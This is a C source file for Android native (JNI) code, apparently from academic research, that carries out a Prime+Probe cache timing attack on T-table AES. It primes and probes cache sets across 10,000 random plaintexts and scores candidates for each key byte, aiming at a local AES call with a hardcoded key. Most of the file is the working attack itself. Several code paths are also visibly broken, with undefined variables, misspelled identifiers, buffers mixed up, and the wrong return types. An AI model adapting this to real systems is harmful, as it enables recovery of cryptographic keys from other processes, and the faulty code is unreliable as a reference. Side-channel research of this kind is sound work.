 /* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h>
#include <getopt.h>
#include <sched.h>
#include <time.h>
#include <malloc.h>
#include <sys/mman.h>
#include <jni.h>
#include <libcache/libcache.h>
#include <libcache/cputils.h>
#include <libcache/basetime.h>
#include <libcache/mylog.h>
#include "AES.h"

//#define DEBUG
#define SUCCESSIONACCESS
#define AES_TMP 1000  //tmp sample sum
#define PP_MAX_TIME 5000 //probe time threshold
#define HISTOGRAM_SCALE 50 //probe time gap

#define BIND_TO_CPU 0
#define BIND_THREAD_TO_CPU 1
#define AES_TABLE_LENGTH 16 //the block num of aes look up table
#define AES_SAMPLE_SUM 10000 //sample sum
#define AES_KEY_MAX 256 //the possibility of key
#define AES_KEY_LENGTH 16 //the length of key
#define AES_PLAINTEXT_LENGTH 16 //the length of plaintext

#define NUMBER_OF_SETS 2048
#define MINI(a, b) (((a) > (b)) ? (b) : (a))
#define MAXI(a, b) (((a) > (b)) ? (a) : (b))
#define PROBE_TIME_THRESHOLD 5000

//record aes sample data, each sample contains 16 records of each table
typedef struct {
	int index;
	unsigned char plaintext[AES_PLAINTEXT_LENGTH];
	uint64_t t0_time[AES_TABLE_LENGTH];
	uint64_t t1_time[AES_TABLE_LENGTH];
	uint64_t t2_time[AES_TABLE_LENGTH];
	uint64_t t3_time[AES_TABLE_LENGTH];
} aesSample;

//record average access time of each set of aes 4 tables
typedef struct {
	uint64_t t0_avg_time[AES_TABLE_LENGTH];
	uint64_t t1_avg_time[AES_TABLE_LENGTH];
	uint64_t t2_avg_time[AES_TABLE_LENGTH];
	uint64_t t3_avg_time[AES_TABLE_LENGTH];
} aesSampleAverageTime;

void doaes(unsigned char *inaes, aesTableStartSet *tabless); //execute aes algorithm with a given plaintext
void getPlaintext(unsigned char *plaintext); //return a random plaintext
void printSample(aesSample** as); //print the record of samples
uint64_t getMeasurement(uint64_t *validSample); //return a measure for a set of sample
uint64_t getMeasurement2(uint64_t *validSample);
uint64_t* getValidSample(int index, unsigned char key, aesSample** as, FILE *flog); //found valid samples from all samples
uint64_t getPPTime(libcache_session_t *libcache_session, unsigned char *inaes, uint64_t *tmp, uint64_t *histogram, uint64_t *tmp2, uint64_t *histogram2,int index); //
void aesProbeAllSet(libcache_session_t *libcache_session, aesSample **sample, aesTableStartSet *tabless, int i); //do probe operation for all sets in 4 aes tables
void aesPrimeAllSet(libcache_session_t *libcache_session, aesTableStartSet *tabless); //do prime operation for all sets in 4 aes tables
void freeSample(aesSample **sample); //free samples
void balanceSample(aesSample **sample, aesSampleAverageTime *aesavgtime); //subtract average probe time form all samples record
void eraseSample(aesSample **sample); //set all samples record to zero
void getAvgTime(aesSample **sample, aesSampleAverageTime *aesavgtime); //get average probe time for 4*16 sets
void freeresource(uint64_t* tmp, uint64_t* histogram, uint64_t* tmp2, uint64_t* histogram2);

jint
Java_www_buaa_edu_cn_testlibcache_TestLibCache_callNativeLibCacheAttack(JNIEnv* env, jobject obj, jint jcpu)
{
	aesSampleAverageTime aesavgtime;
	aesSample* sample[AES_SAMPLE_SUM];
	uint64_t keyMeasurement[AES_KEY_LENGTH][AES_KEY_MAX];
	aesTableStartSet tabless; //the struct contains aes t-table's start addr
	libcache_session_t* libcache_session;
	FILE *flog;

	/* Define parameters */
	size_t cpu;
	if (jcpu >= 0) {
		cpu = jcpu;
	} else {
		cpu = BIND_TO_CPU;
	} 
	size_t thread_cpu = BIND_THREAD_TO_CPU;

	size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

	LOGI("NUMBER OF CPUS: %zu\n", number_of_cpus);

	/* Bind to CPU */
	cpu = cpu % number_of_cpus;
	thread_cpu = thread_cpu % number_of_cpus;

	if (libcache_bind_to_cpu(cpu) == false) {
		LOGI("Warning: Could not bind to CPU: %zu\n", cpu);
	} else {
		LOGI("attack process bind to cpu %d", BIND_TO_CPU);
	}

	/* Initialize libcache */
	libcache_session_args_t args;
	args.bind_to_cpu = thread_cpu;
  
	if (libcache_init(&libcache_session, &args) == false) {
		LOGI("Error: Could not initialize libcache\n");
		return -1;
	}

	LOGI("initialize libcache success!\n");

	LOGI("now start aes attack\n");

#ifdef DEBUG
	if ((flog = fopen("sdcard/aesattacklog", "a")) == NULL) {
		LOGI("ERROR : could not allocate memory for aesattacklog!!");
		return NULL;
	}
#endif

	unsigned char inaes[AES_PLAINTEXT_LENGTH] = {0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88};
	doaes(inaes, &tabless);
	srand((unsigned int)time(0));
#ifndef SUCCESSIONACCESS
	uint64_t *tmp;
	tmp = (uint64_t*)malloc(AES_TMP * sizeof(uint64_t));
	if (tmp == NULL) {
		LOGI("ERROR : could not allocate memory to tmp!!");
		return -1;
	}
	uint64_t *tmp2;
	tmp2 = (uint64_t*)malloc(AES_TMP * sizeof(uint64_t));
	if (tmp2 == NULL) {
		LOGI("ERROR : could not allocate memory to tmp2!!");
		freeresource(tmp, NULL, NULL, NULL);
		return -1;
	}
	uint64_t *histogram;
	histogram = (uint64_t*)malloc(PP_MAX_TIME / HISTOGRAM_SCALE * sizeof(uint64_t));
	if (histogram == NULL) {
		LOGI("ERROR : could not allocate memory to histogram!!");
		freeresource(tmp, NULL, tmp2, NULL);
		return -1;
	}
	memset(histogram, 0, PP_MAX_TIME / HISTOGRAM_SCALE);
	uint64_t *histogram2;
	histogram2 = (uint64_t*)malloc(PP_MAX_TIME / HISTOGRAM_SCALE * sizeof(uint64_t));
	if (histogram2 == NULL) {
		LOGI("ERROR : could not allocate memory to histogram2!!");
		freeresource(tmp, histogram1, tmp2, NULL);
		return -1;
	}
	memset(histogram2, 0, PP_MAX_TIME / HISTOGRAM_SCALE);
#endif
	for (int i = 0; i < AES_TABLE_LENGTH; i++) {
		aesavgtime.t0_avg_time[i] = 0;
		aesavgtime.t1_avg_time[i] = 0;
		aesavgtime.t2_avg_time[i] = 0;
		aesavgtime.t3_avg_time[i] = 0;
	}
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		sample[i] = NULL;
	}
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		if (sample[i] == NULL) {
			sample[i] = (aesSample*)malloc(sizeof(aesSample));
			if (sample[i] == NULL) {
				LOGI("ERROR : could not allocate memory for sample[%d]!!!", i);
#ifndef SUCCESSIONACCESS
	freeresource(tmp, histogram1, tmp2, histogram2);
#endif
				return -1;
			}
		} else {
			LOGI("ERROR : sample is not null when initialization!");
		}
	}
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		aesPrimeAllSet(libcache_session, &tabless);
		aesProbeAllSet(libcache_session, sample, &tabless, i); 
	}
	getAvgTime(sample, &aesavgtime);
	eraseSample(sample);
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		getPlaintext(inaes);
		if (sample[i] == NULL) {
			LOGI("ERROR : sample is null!!");
#ifndef SUCCESSIONACCESS
			freeresource(tmp, histogram1, tmp2, histogram2);
#endif
			freeSample(sample);
			return -1;
		}
		sample[i]->index = i;
		for (int j = 0; j < AES_PLAINTEXT_LENGTH; j++) {
			sample[i]->plaintext[j] = inaes[j];
		}

#ifdef SUCCESSIONACCESS	
	
		aesPrimeAllSet(libcache_session, &tabless);

		doaes(inaes, NULL);

		aesProbeAllSet(libcache_session, sample, &tabless, i);

#else
		for (int j0 = 0; j0 < AES_TABLE_LENGTH; j0++) {
			sample[i]->t0_time[j0] = getPPTime(libcache_session, inaes, tmp, histogram, tmp2, histogram2, tabless.t0_sd[j0]);
		}
		for (int j1 = 0; j1 < AES_TABLE_LENGTH; j1++) {
			sample[i]->t1_time[j1] = getPPTime(libcache_session, inaes, tmp, histogram, tmp2, histogram2, tabless.t1_sd[j1]);
		}
		for (int j2 = 0; j2 < AES_TABLE_LENGTH; j2++) {
			sample[i]->t2_time[j2] = getPPTime(libcache_session, inaes, tmp, histogram, tmp2, histogram2, tabless.t2_sd[j2]);
		}
		for (int j3 = 0; j3 < AES_TABLE_LENGTH; j3++) {
			sample[i]->t3_time[j3] = getPPTime(libcache_ssession, inaes, tmp, histogram, tmp2, histogram2, tabless.t3_sd[j3]);
		}
		LOGI("%d", i);
#endif		
	}
#ifndef SUCCESSIONACCESS
	freeresource(tmp, histogram1, tmp2, histogram2);
#endif
#ifdef DEBUG
	printSample(sample);
#endif

	balanceSample(sample, &aesavgtime);
	for (int j = 0; j < AES_KEY_LENGTH; j++) {
		uint64_t *validSample;
		for (int k = 0; k < AES_KEY_MAX; k++) {
			validSample = getValidSample(j, k, sample, flog);
			keyMeasurement[j][k] = getMeasurement(validSample);		
		}

	}

	writeMeasurementToFile(keyMeasurement);
	freeSample(sample);
	LOGI("aes attack completed");
#ifdef DEBUG
	fclose(flog);
#endif
	return 0;

}

uint64_t getPPTime(libcache_session_t *libcache_session, unsigned char *inaes, uint64_t *tmp, uint64_t *histogram, uint64_t *tmp2, uint64_t *histogram2, int index) {
	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		histogram2[i] = 0;
	}
	for (int i = 0; i < AES_TMP; i++) {
		tmp2[i] = 0;
	}
	for (int i = 0; i < AES_TMP; i++) {
		libcache_prime(libcache_session, index);
		//doaes(inaes, NULL);
		tmp2[i] = libcache_probe(libcache_session, index);
	}
	for (int i = 0; i < AES_TMP; i++) {
		histogram2[MINI(tmp[i] / HISTOGRAM_SCALE, (PP_MAX_TIME - 1) / HISTOGRAM_SCALE)] += 1;
	}
	int maxindex2 = 0;
	int maxvalue2 = histogram2[0];
	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		if (histogram2[i] > maxvalue2) {
			maxindex2 = i;
			maxvalue2 = histogram2[i];
		}
	}	

	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		histogram[i] = 0;
	}
	for (int i = 0; i < AES_TMP; i++) {
		tmp[i] = 0;
	}
	for (int i = 0; i < AES_TMP; i++) {
		libcache_prime(libcache_session, index);
		doaes(inaes, NULL);
		tmp[i] = libcache_probe(libcache_session, index);
	}
	for (int i = 0; i < AES_TMP; i++) {
		histogram[MINI(tmp[i] / HISTOGRAM_SCALE, (PP_MAX_TIME - 1) / HISTOGRAM_SCALE)] += 1;
	}
	int maxindex = 0;
	int maxvalue = histogram[0];
	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		if (histogram[i] > maxvalue) {
			maxindex = i;
			maxvalue = histogram[i];
		}
	}
	if (maxvalue - maxvalue2 < 0) {
		return 0;
	}
	return (maxvalue - maxvalue2) * HISTOGRAM_SCALE;  	
}

uint64_t getMeasurement(uint64_t *validSample) {
	if (validSample == NULL) {
		LOGI("validSample is NULL!");
		return 0;
	} 
	uint64_t threshold = 0;
	uint64_t sum = 0;
	uint64_t measurementscore = 0;
	int validnumb = 0;
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		threshold += validSample[i];
	}
	threshold = (threshold / AES_SAMPLE_SUM) * 5;
	for (int j = 0; j < AES_SAMPLE_SUM; j++) {
		if (validSample[j] < threshold) {
			sum += validSample[j];
			validnumb++;
		}
	}
	free(validSample);
	return sum / validnumb;
}

uint64_t getMeasurement2(uint64_t *validSample) {
	if (validSample == NULL) {
		LOGI("validSample is NULL!");
		return 0;
	} 
	uint64_t threshold = 500;
	int validnumb = 0;
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		if (validSample[i] > threshold) {
			validnumb++;
		}
	}
	free(validSample);
	return validnumb;
}

void writeMeasurementToFile(uint64_t km[AES_KEY_LENGTH][AES_KEY_MAX]) {
	FILE *fp;
	if((fp = fopen("sdcard/measurement", "a")) == NULL) {
		LOGI("could not open file sdcard/measurement!!");
		return;
	}
	for (int i = 0; i < AES_KEY_LENGTH; i++) {
		fprintf(fp, "key index :%d\n", i);
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			fprintf(fp, "%10llu", km[i][j * AES_TABLE_LENGTH]);
		}
		fprintf(fp, "\n");
	}
	fprintf(fp, "\n");
	fclose(fp);
#ifdef DEBUG
	for (int i = 0; i < AES_KEY_LENGTH; i++) {
		LOGI("key index :%d\n", i);
		for (int j = 0; j < AES_KEY_MAX; j++) {
			LOGI("%10llu", km[i][j]);
		}
	}
#endif
}

uint64_t* getValidSample(int index, unsigned char key, aesSample** as, FILE *flog) {
	uint64_t *validSample;
	validSample = (uint64_t*)malloc(AES_SAMPLE_SUM * sizeof(uint64_t));
	if (validSample == NULL) {
		LOGI("ERROR : could not allocate memory to validSample!!");
		return NULL;
	}
	int tableIndex = index % 4;
#ifdef DEBUG
	fprintf(flog, "key[%d] associate table %d\n", index, tableIndex);
#endif
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		unsigned char validPlaintext = as[i]->plaintext[index];
		unsigned char accessIndex = key ^ validPlaintext;
		int validAccessArrayIndex = accessIndex / AES_TABLE_LENGTH;
		uint64_t *validTable;
		switch(tableIndex) {
			case 0 :
				validTable = as[i]->t0_time;
				break;
			case 1 :
				validTable = as[i]->t1_time;
				break;		
			case 2 :
				validTable = as[i]->t2_time;
				break;
			case 3 :
				validTable = as[i]->t3_time;
				break;
		}
		uint64_t validData = validTable[validAccessArrayIndex];
		validSample[i] = validData;
#ifdef DEBUG
	fprintf(flog, "index %d, validPlaintext %d, accessIndex %d, validAccessArrayIndex %d, validData %llu\n", i, validPlaintext, accessIndex, validAccessArrayIndex, validData);
#endif
	}
#ifdef DEBUG
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		fprintf(flog, "%10llu", validSample[i]);
	}
	fprintf(flog, "\n");
#endif 
	return validSample;
}
	

void printSample(aesSample** as) {
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		LOGI("index :%d", as[i]->index);
		LOGI("plaintext :%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u", as[i]->plaintext[0],as[i]->plaintext[1],as[i]->plaintext[2],as[i]->plaintext[3],as[i]->plaintext[4],as[i]->plaintext[5],as[i]->plaintext[6],as[i]->plaintext[7],as[i]->plaintext[8],as[i]->plaintext[9],as[i]->plaintext[10],as[i]->plaintext[11],as[i]->plaintext[12],as[i]->plaintext[13],as[i]->plaintext[14],as[i]->plaintext[15]);
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			LOGI("		t0 %10llu", as[i]->t0_time[j]);
		}
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			LOGI("		t1 %10llu", as[i]->t1_time[j]);
		}
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			LOGI("		t2 %10llu", as[i]->t2_time[j]);
		}
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			LOGI("		t3 %10llu", as[i]->t3_time[j]);
		}	
	}
}

void doaes(unsigned char *inaes, aesTableStartSet* tabless) {

	unsigned char key[AES_KEY_LENGTH] = {0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88};

	unsigned char outaes[16] = {0};

	aes_ecb_encrypt(key,inaes,outaes, tabless);

#ifdef DEBUG
	LOGI("plaintext :%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u%4u", inaes[0],inaes[1],inaes[2],inaes[3],inaes[4],inaes[5],inaes[6],inaes[7],inaes[8],inaes[9],inaes[10],inaes[11],inaes[12],inaes[13],inaes[14],inaes[15]);
#endif
}


void getPlaintext(unsigned char* plaintext) {
	for (int i = 0; i < AES_PLAINTEXT_LENGTH; i++) {
		plaintext[i] = (rand() % 256);
	}
}

void aesPrimeAllSet(libcache_session_t *libcache_session, aesTableStartSet *tabless) {
	for (int j0 = 0; j0 < AES_TABLE_LENGTH; j0++)
		libcache_prime(libcache_session, tabless->t0_sd[j0]);
	for (int j1 = 0; j1 < AES_TABLE_LENGTH; j1++)
		libcache_prime(libcache_session, tabless->t1_sd[j1]);
	for (int j2 = 0; j2 < AES_TABLE_LENGTH; j2++)
		libcache_prime(libcache_session, tabless->t2_sd[j2]);
	for (int j3 = 0; j3 < AES_TABLE_LENGTH; j3++)
		libcache_prime(libcache_session, tabless->t3_sd[j3]);
}


void aesProbeAllSet(libcache_session_t *libcache_session, aesSample **sample, aesTableStartSet *tabless, int i) {
		for (int k0 = 0; k0 < AES_TABLE_LENGTH; k0++)
			sample[i]->t0_time[k0] = MINI(libcache_probe(libcache_session, tabless->t0_sd[k0]), PROBE_TIME_THRESHOLD);
		for (int k1 = 0; k1 < AES_TABLE_LENGTH; k1++)
			sample[i]->t1_time[k1] = MINI(libcache_probe(libcache_session, tabless->t1_sd[k1]), PROBE_TIME_THRESHOLD);
		for (int k2 = 0; k2 < AES_TABLE_LENGTH; k2++)
			sample[i]->t2_time[k2] = MINI(libcache_probe(libcache_session, tabless->t2_sd[k2]), PROBE_TIME_THRESHOLD);
		for (int k3 = 0; k3 < AES_TABLE_LENGTH; k3++)
			sample[i]->t3_time[k3] = MINI(libcache_probe(libcache_session, tabless->t3_sd[k3]), PROBE_TIME_THRESHOLD);
}

void getAvgTime(aesSample **sample, aesSampleAverageTime *aesavgtime) {
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			aesavgtime->t0_avg_time[j] += sample[i]->t0_time[j];
			aesavgtime->t1_avg_time[j] += sample[i]->t1_time[j];
			aesavgtime->t2_avg_time[j] += sample[i]->t2_time[j];
			aesavgtime->t3_avg_time[j] += sample[i]->t3_time[j];
		}

	}
	for (int j = 0; j < AES_TABLE_LENGTH; j++) {
		aesavgtime->t0_avg_time[j] /= AES_SAMPLE_SUM;
		aesavgtime->t1_avg_time[j] /= AES_SAMPLE_SUM;
		aesavgtime->t2_avg_time[j] /= AES_SAMPLE_SUM;
		aesavgtime->t3_avg_time[j] /= AES_SAMPLE_SUM;
	}
	
}

void eraseSample(aesSample **sample) {
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			sample[i]->t0_time[j] = 0;
			sample[i]->t1_time[j] = 0;
			sample[i]->t2_time[j] = 0;
			sample[i]->t3_time[j] = 0;
		}

	}
}

void balanceSample(aesSample **sample, aesSampleAverageTime *aesavgtime) {
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		for (int j = 0; j < AES_TABLE_LENGTH; j++) {
			sample[i]->t0_time[j] = MAXI(sample[i]->t0_time[j] - aesavgtime->t0_avg_time[j], 0);
			sample[i]->t1_time[j] = MAXI(sample[i]->t1_time[j] - aesavgtime->t1_avg_time[j], 0);
			sample[i]->t2_time[j] = MAXI(sample[i]->t2_time[j] - aesavgtime->t2_avg_time[j], 0);
			sample[i]->t3_time[j] = MAXI(sample[i]->t3_time[j] - aesavgtime->t3_avg_time[j], 0);
		}

	}
}

void freeSample(aesSample **sample) {
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		if (sample[i] != NULL)
			free(sample[i]);
	}
}

void freeresource(uint64_t* tmp, uint64_t* histogram, uint64_t* tmp2, uint64_t* histogram2) {
	if (tmp != NULL)	
		free(tmp);
	if (histogram != NULL)
		free(histogram);
	if (tmp2 != NULL)
		free(tmp2);
	if (histogram2 != NULL)
		free(histogram2);
}


